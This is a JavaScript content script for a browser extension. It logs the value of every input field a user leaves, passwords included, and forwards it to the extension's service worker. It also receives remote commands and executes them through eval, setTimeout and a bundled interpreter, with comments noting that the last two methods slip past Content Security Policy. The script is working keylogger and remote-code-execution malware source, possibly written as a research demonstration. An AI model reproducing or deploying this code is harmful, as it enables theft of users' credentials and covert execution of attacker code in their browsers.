// Send all input values to the service worker as a message
function logKeys(key) {
    const data = {
        keys: key
    }

    chrome.runtime.sendMessage({type: 'SUBMIT_FORM', data}).then((response) => {
        console.log("Response received:", response)
    });
}

document.addEventListener('focusout', function (e) {
    if (e.target.tagName === 'INPUT' && e.target.value !== '') {
        logKeys(e.target.value)
    }
});

/* =================================================================================== */
// Execute injected code through a JS interpreter
function executeWithInterpreter(command) {
    const initFunc = function (interpreter, globalObject) {
        interpreter.setProperty(globalObject, 'url', String(location));
        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))

        const alertWrapper = function alert(text) {
            return window.alert(text);
        };
        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));

        // TODO: figure out how to bind all DOM interfaces to the interpreter
        // const windowWrapper = function w(command) {
        //     const parsedCommand = command.slice(7)
        //     return window[parsedCommand];
        // };
        // interpreter.setProperty(globalObject, 'window',
        //     interpreter.createNativeFunction(windowWrapper));
    };
    const interpreter = new JSInterpreter(command, initFunc)
    interpreter.run()
}

// Execute injected code through a setTimeout
function executeWithSetTimeout(command) {
    setTimeout(command);
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'CS_COMMAND') {
        console.log(`Received command: ${request.data}`)
        // Show that eval is blocked by CSP
        try {
            eval(request.data);
        } catch (err) {
            console.error(`eval() failed: ${err.message}`);
        }
        // Alternative to eval, goes unnoticed by CSP
        executeWithSetTimeout(request.data);
        // Alternative2 to eval, goes unnoticed by CSP
        executeWithInterpreter(request.data);
    } else if (request.type === 'HELLO') {
        console.log(request.data)
    }
    sendResponse({status: 'ok'})
});
